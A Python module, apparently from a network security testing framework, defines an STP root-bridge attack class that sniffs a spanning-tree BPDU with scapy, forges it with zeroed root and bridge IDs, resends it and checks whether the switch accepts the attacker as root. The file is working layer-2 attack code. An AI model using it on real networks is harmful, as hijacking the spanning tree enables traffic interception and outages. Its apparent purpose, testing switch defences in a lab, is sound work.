from attacks.attack import Attack
import netns
import scapy.all as scapy

class STProot(Attack):
    """
    Attacker tries to become the STP root Bridge
    """

    def setup(self):
        with netns.NetNS(nsname=self.attack_ns):
            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=10)
            if len(packet) == 0:
                raise RuntimeError("No STP packets on Link.")
            else:
                if (packet[0].bpduflags & 0b1100) == 8:
                    raise RuntimeError("Attacker is already root bridge.")

    def attack(self) -> scapy.Packet:
        with netns.NetNS(nsname=self.attack_ns):
            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=10)
            packet[0].src='00:00:00:00:00:01'
            packet[0].rootid=0
            packet[0].rootmac='00:00:00:00:00:01'
            packet[0].bridgeid=0
            packet[0].bridgemac='00:00:00:00:00:01'

            scapy.sendp(packet[0], iface=self.attack_if)
            ans = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=30)
            return ans[0]

    def evaluate(self, ans:scapy.Packet) -> bool:
        # Check for Topology Change
        if ans.bpdutype == 0x80:
            return True
        # Check RSTP Packet for Root Bridge Port Type
        elif ans.bpdutype == 0x02 and (ans.bpduflags & 0b1100) == 8:
            return True
        else:
            return False

    def run(self) -> bool:
        self.attack_if = self.interfaces[2]
        self.attack_ns = "host2"
        self.setup()
        answer = self.attack()

        return self.evaluate(answer)
